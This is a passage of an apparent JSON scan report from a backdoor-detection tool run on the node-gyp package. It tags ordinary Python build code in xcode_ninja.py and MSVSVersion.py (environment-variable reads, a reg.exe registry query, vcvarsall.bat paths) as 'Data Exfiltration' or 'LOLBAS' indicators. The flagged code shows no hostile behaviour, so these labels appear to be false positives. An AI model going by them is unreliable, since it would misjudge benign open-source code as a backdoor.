                  "endColumn": 57,
                  "snippet": {
                    "text": "    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n    # Tell Xcode to look in |ninja_toplevel| for build products.\n",
                    "rendered": {
                      "text": "    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n    # Tell Xcode to look in |ninja_toplevel| for build products.\n",
                      "markdown": "`    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n    # Tell Xcode to look in |ninja_toplevel| for build products.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 38,
                  "endLine": 79,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    ninja_target[\"product_name\"] = product_name\n    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n",
                    "rendered": {
                      "text": "    ninja_target[\"product_name\"] = product_name\n    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n",
                      "markdown": "`    ninja_target[\"product_name\"] = product_name\n    if product_extension:\n        ninja_target[\"product_extension\"] = product_extension\n    ninja_target[\"toolset\"] = old_spec.get(\"toolset\")\n    ninja_target[\"default_configuration\"] = old_spec.get(\"default_configuration\")\n    ninja_target[\"configurations\"] = {}\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 32,
                  "endLine": 72,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n    ninja_target[\"target_name\"] = target_name\n",
                    "rendered": {
                      "text": "\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n    ninja_target[\"target_name\"] = target_name\n",
                      "markdown": "`\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n    ninja_target[\"target_name\"] = target_name\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 27,
                  "endLine": 71,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n",
                    "rendered": {
                      "text": "        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n",
                      "markdown": "`        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n    ninja_target = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 26,
                  "endLine": 70,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n",
                    "rendered": {
                      "text": "        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n",
                      "markdown": "`        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n    product_extension = old_spec.get(\"product_extension\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 48,
                  "endLine": 68,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n",
                    "rendered": {
                      "text": "        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n",
                      "markdown": "`        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 21,
                  "endLine": 68,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n",
                    "rendered": {
                      "text": "        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n",
                      "markdown": "`        ninja_toplevel = os.path.join(\n            options.toplevel_dir, gyp.generator.ninja.ComputeOutputDir(params)\n        )\n        jobs = params.get(\"generator_flags\", {}).get(\"xcode_ninja_jobs\", 0)\n\n    target_name = old_spec.get(\"target_name\")\n    product_name = old_spec.get(\"product_name\", target_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 3,
                  "endLine": 171,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                    "rendered": {
                      "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                      "markdown": "`    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 22,
                  "endLine": 83,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        return os.path.normpath(os.path.join(self.path, \"VC/bin\", tool))\n\n    def DefaultToolset(self):\n        \"\"\"Returns the msbuild toolset version that will be used in the absence\n    of a user override.\"\"\"\n        return self.default_toolset\n\n",
                    "rendered": {
                      "text": "        return os.path.normpath(os.path.join(self.path, \"VC/bin\", tool))\n\n    def DefaultToolset(self):\n        \"\"\"Returns the msbuild toolset version that will be used in the absence\n    of a user override.\"\"\"\n        return self.default_toolset\n\n",
                      "markdown": "`        return os.path.normpath(os.path.join(self.path, \"VC/bin\", tool))\n\n    def DefaultToolset(self):\n        \"\"\"Returns the msbuild toolset version that will be used in the absence\n    of a user override.\"\"\"\n        return self.default_toolset\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 570,
                  "startColumn": 44,
                  "endLine": 570,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        if not allow_fallback:\n            raise ValueError(\"Could not locate Visual Studio installation.\")\n        if version == \"auto\":\n            # Default to 2005 if we couldn't find anything\n            return _CreateVersion(\"2005\", None)\n        else:\n            return _CreateVersion(version, None)\n",
                    "rendered": {
                      "text": "        if not allow_fallback:\n            raise ValueError(\"Could not locate Visual Studio installation.\")\n        if version == \"auto\":\n            # Default to 2005 if we couldn't find anything\n            return _CreateVersion(\"2005\", None)\n        else:\n            return _CreateVersion(version, None)\n",
                      "markdown": "`        if not allow_fallback:\n            raise ValueError(\"Could not locate Visual Studio installation.\")\n        if version == \"auto\":\n            # Default to 2005 if we couldn't find anything\n            return _CreateVersion(\"2005\", None)\n        else:\n            return _CreateVersion(version, None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 133,
                  "startColumn": 77,
                  "endLine": 133,
                  "endColumn": 83,
                  "snippet": {
                    "text": "                return [vcvarsall, \"amd64_x86\"]\n            else:\n                # Otherwise, the standard x86 compiler. We don't use VC/vcvarsall.bat\n                # for x86 because vcvarsall calls vcvars32, which it can only find if\n                # VS??COMNTOOLS is set, which isn't guaranteed.\n                return [JoinPath(self.path, \"Common7\", \"Tools\", \"vsvars32.bat\")]\n        elif target_arch == \"x64\":\n",
                    "rendered": {
                      "text": "                return [vcvarsall, \"amd64_x86\"]\n            else:\n                # Otherwise, the standard x86 compiler. We don't use VC/vcvarsall.bat\n                # for x86 because vcvarsall calls vcvars32, which it can only find if\n                # VS??COMNTOOLS is set, which isn't guaranteed.\n                return [JoinPath(self.path, \"Common7\", \"Tools\", \"vsvars32.bat\")]\n        elif target_arch == \"x64\":\n",
                      "markdown": "`                return [vcvarsall, \"amd64_x86\"]\n            else:\n                # Otherwise, the standard x86 compiler. We don't use VC/vcvarsall.bat\n                # for x86 because vcvarsall calls vcvars32, which it can only find if\n                # VS??COMNTOOLS is set, which isn't guaranteed.\n                return [JoinPath(self.path, \"Common7\", \"Tools\", \"vsvars32.bat\")]\n        elif target_arch == \"x64\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 48,
                  "endLine": 120,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n",
                    "rendered": {
                      "text": "\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n",
                      "markdown": "`\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 120,
                  "startColumn": 19,
                  "endLine": 120,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n",
                    "rendered": {
                      "text": "\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n",
                      "markdown": "`\n            return [script_path, arg]\n\n        # We try to find the best version of the env setup batch.\n        vcvarsall = JoinPath(self.path, \"VC\", \"vcvarsall.bat\")\n        if target_arch == \"x86\":\n            if (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 557,
                  "startColumn": 33,
                  "endLine": 557,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n",
                    "rendered": {
                      "text": "    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n",
                      "markdown": "`    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 555,
                  "startColumn": 30,
                  "endLine": 555,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n",
                    "rendered": {
                      "text": "        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n",
                      "markdown": "`        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 28,
                  "endLine": 537,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n",
                      "markdown": "`  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 34,
                  "endLine": 171,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                    "rendered": {
                      "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                      "markdown": "`    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 25,
                  "endLine": 102,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n",
                    "rendered": {
                      "text": "\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n",
                      "markdown": "`\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 22,
                  "endLine": 101,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n",
                    "rendered": {
                      "text": "            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n",
                      "markdown": "`            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 28,
                  "endLine": 95,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n",
                    "rendered": {
                      "text": "        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n",
                      "markdown": "`        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
